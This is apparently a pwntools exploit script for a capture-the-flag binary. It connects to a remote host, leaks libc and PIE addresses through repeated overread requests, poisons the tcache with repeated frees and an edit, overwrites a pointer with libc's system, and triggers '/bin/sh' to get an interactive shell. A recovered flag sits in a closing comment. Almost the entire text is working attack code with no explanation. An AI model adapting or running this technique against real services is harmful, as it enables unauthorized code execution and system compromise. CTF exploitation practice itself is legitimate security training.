from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(name,age):
	cmd(0)
	p.sendlineafter(": ",str(age))
	p.sendafter(": ",name)
def free():
	cmd(2)
def edit(c,age=1):
	cmd(1)
	p.sendlineafter(": ",str(age))
	p.sendafter(": ",c)
def leak(c):
	cmd(3)
	p.sendafter(": \n",c)
context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p=process('./node')
p=remote("34.69.116.108",3333)
#gdb.attach(p,'')
leak("A"*0x10)
p.readuntil("A"*0x10)
base=u64(p.read(6).ljust(8,'\x00'))#-(0x7ffff7dd0760-0x7ffff79e4000)
log.warning(hex(base))

leak("A"*0x18)
p.readuntil("A"*0x18)
pie=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd0760-0x7ffff79e4000)
log.warning(hex(pie))

leak("A"*0x10)
p.readuntil("A"*0x10)
base=u64(p.read(6).ljust(8,'\x00'))-(0x5555555560fa-0x0000555555554000)#
log.warning(hex(base))
addr =0x000000000004058+base+8

add("n132",1)
for x in range(6):
	free()
add("Y"*0x19,1)
edit(p64(addr))
add("Y"*0x19,1)

tmp=pie
pie=base
base=tmp
libc.address=base
log.warning(hex(pie))
log.warning(hex(base))
#gdb.attach(p,'b *{}'.format(hex(pie+0x00055555555526D-0x0000555555554000)))
add("A",1)
edit(p64(libc.sym['system']))

leak("/bin/sh")

p.interactive('n132>')
#rooters{1_d0n7_f33l_g00d_mR_Pwn34}ctf
